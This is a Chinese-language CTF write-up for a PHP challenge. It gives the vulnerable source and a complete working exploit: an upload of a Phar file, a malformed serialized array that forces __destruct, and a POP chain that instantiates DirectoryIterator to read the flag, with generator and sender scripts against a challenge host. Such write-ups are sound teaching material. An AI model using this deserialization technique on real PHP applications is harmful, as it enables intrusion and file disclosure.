tags:: CTF/PHP/Phar, CTF/PHP/反序列化

- # 题目
  
  ```php
  <?php
  highlight_file(__FILE__);
  
  function waf($data){
  if (is_array($data)){
    die("Cannot transfer arrays");
  }
  if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) {
    die("You can't do");
  }
  }
  
  class air{
  public $p;
  
  public function __set($p, $value) {
    $p = $this->p->act;
    echo new $p($value);
  }
  }
  
  class tree{
  public $name;
  public $act;
  
  public function __destruct() {
    return $this->name();
  }
  public function __call($name, $arg){
    $arg[1] =$this->name->$name;
  
  }
  }
  
  class apple {
  public $xxx;
  public $flag;
  public function __get($flag)
  {
    $this->xxx->$flag = $this->flag;
  }
  }
  
  class D {
  public $start;
  
  public function __destruct(){
    $data = $_POST[0];
    if ($this->start == 'w') {
        waf($data);
        $filename = "/tmp/".md5(rand()).".jpg";
        file_put_contents($filename, $data);
        echo $filename;
    } else if ($this->start == 'r') {
        waf($data);
        $f = file_get_contents($data);
        if($f){
            echo "It is file";
        }
        else{
            echo "You can look at the others";
        }
    }
  }
  }
  
  class banana {
  public function __get($name){
    return $this->$name;
  }
  }
  // flag in /
  if(strlen($_POST[1]) < 55) {
  $a = unserialize($_POST[1]);
  }
  else{
  echo "str too long";
  }
  
  throw new Error("start");
  ?> 
  ```
- # WP
  
  总体思路：
  
  1. 通过Class D写入并加载Phar文件
  2. 通过Phar文件反序列化恶意对象
  3. 通过恶意对象的实例化
  4. 使用DirectoryIterator读取文件夹，并使用SplFileObject读取flag
- ## 通过Class D写入Phar文件
  
  ```python
  
  
  url = "http://f158c838-3269-4309-a278-e68c93230025.node4.buuoj.cn:81/"
  
  one = 'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"w";}i:1;-i:1;}'
  
  zero = fileread.readbytesfrom("exp1.tar.gz")
  
  r = base_post(url, data = {
      "0": zero,
      "1": one
  })
  
  re_obj = re.search("/tmp/[0-9a-f]+?\.jpg", r.text)
  if not re_obj:
      print(r.text)
      raise ValueError("Not Fount")
  
  file_path = re_obj.group(0)
  
  print(file_path)
  
  one = 'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"r";}i:1;-i:1;}'
  
  zero = "phar://{}/test.txt".format(file_path)
  
  r = base_post(url, data = {
      "0": zero,
      "1": one
  })
  
  re_obj = re.search("the others([\s\S]+?)<br />", r.text)
  
  if re_obj:
      print(re_obj.group(1))
  else:
      print(r.text)
  
  ```
  
  题目末尾有throw阻止`__destruct`的执行，可以通过损坏的数组`a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"r";}i:1;-i:1;}`强制执行`__destruct`
  
  > 也就是用其中的`-i:1;`强制执行前面对象的`__destruct`
  ## 通过Phar文件反序列化恶意类
  
  ```php
  <?php
  // $tree1是我们的恶意类
  $o = [$tree1, 5];
  
  mkdir(".phar");
  
  file_put_contents(".phar/.metadata", str_replace(";i:5;", ";-i:5;", serialize($o)));
  file_put_contents(".phar/test.txt", "123test.txt");
  
  system("tar -cf exp1.tar .phar/");
  
  system("gzip exp1.tar -f");
  
  system("rm -rf .phar exp1.tar")
  ?>
  ```
  
  
  简单的生成一个Phar文件，不多说
- ## 通过恶意对象进行实例化
  
  ```php
  <?php
  
  class air{
  public $p;
  
  public function __set($p, $value) {
    $p = $this->p->act;
    echo new $p($value);
  }
  }
  
  class tree{
  public $name;
  public $act;
  
  public function __destruct() {
    return $this->name();
  }
  public function __call($name, $arg){
    $arg[1] =$this->name->$name;
  
  }
  } 
  
  
  class apple {
  public $xxx;
  public $flag;
  public function __get($flag)
  {
    $this->xxx->$flag = $this->flag;
  }
  }
  
  $tree1 = new tree();
  $tree1 -> name = new apple();
  $tree1 -> name -> flag = "glob:///f*";
  $tree1 -> name -> xxx = new air();
  $tree1 -> name -> xxx -> p = new tree();
  $tree1 -> name -> xxx -> p -> act = "DirectoryIterator";
  ```
  
  看到air的__set有实例化对象
  
  要调用air的__set可以使用apple的__get
  
  要调用apple的__get可以使用tree的__call
  
  要调用tree的__call可以使用tree的__destruct
  
  所以POP链为：
  
  ```
  tree.__destruct => tree.__call => apple.__get => air.__set => 实例化
  ```
  
  其中实例化的参数就是第四步的`$value`，也就是第三步的`$this->flag`
  
  所以：
  
  ```php
  $tree1 = new tree();
  // 第二步
  $tree1 -> name = new apple();
  $tree1 -> name -> flag = "glob:///f*";
  // 第三步
  $tree1 -> name -> xxx = new air();
  // 第四步
  $tree1 -> name -> xxx -> p = new tree();
  $tree1 -> name -> xxx -> p -> act = "DirectoryIterator";
  ```
- ## 完整POC
  
  test.php
  
  ```php
  <?php
  
  class air{
  public $p;
  
  public function __set($p, $value) {
      $p = $this->p->act;
      echo new $p($value);
  }
  }
  
  class tree{
  public $name;
  public $act;
  
  public function __destruct() {
      return $this->name();
  }
  public function __call($name, $arg){
      $arg[1] =$this->name->$name;
  
  }
  } 
  
  
  class apple {
  public $xxx;
  public $flag;
  public function __get($flag)
  {
      $this->xxx->$flag = $this->flag;
  }
  }
  
  $tree1 = new tree();
  $tree1 -> name = new apple();
  $tree1 -> name -> flag = "glob:///f*";
  $tree1 -> name -> xxx = new air();
  $tree1 -> name -> xxx -> p = new tree();
  $tree1 -> name -> xxx -> p -> act = "DirectoryIterator";
  
  $o = [$tree1, 1];
  
  mkdir(".phar");
  
  // echo str_replace(";i:1;", ";-i:1;", serialize($o));
  
  file_put_contents(".phar/.metadata", str_replace(";i:1;", ";-i:1;", serialize($o)));
  file_put_contents(".phar/test.txt", "123test.txt");
  
  system("tar -cf exp1.tar .phar/");
  
  system("gzip exp1.tar -f");
  
  system("rm -rf .phar exp1.tar")
  
  ?>
  ```
  
  test.py
  
  ```python
  
  url = "http://f158c838-3269-4309-a278-e68c93230025.node4.buuoj.cn:81/"
  
  one = 'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"w";}i:1;-i:1;}'
  
  zero = fileread.readbytesfrom("exp1.tar.gz")
  
  r = base_post(url, data = {
      "0": zero,
      "1": one
  })
  
  re_obj = re.search("/tmp/[0-9a-f]+?\.jpg", r.text)
  if not re_obj:
      print(r.text)
      raise ValueError("Not Fount")
  
  file_path = re_obj.group(0)
  
  print(file_path)
  
  one = 'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"r";}i:1;-i:1;}'
  
  zero = "phar://{}/test.txt".format(file_path)
  
  r = base_post(url, data = {
      "0": zero,
      "1": one
  })
  
  re_obj = re.search("the others([\s\S]+?)<br />", r.text)
  
  if re_obj:
      print(re_obj.group(1))
  else:
      print(r.text)
  
  ```
-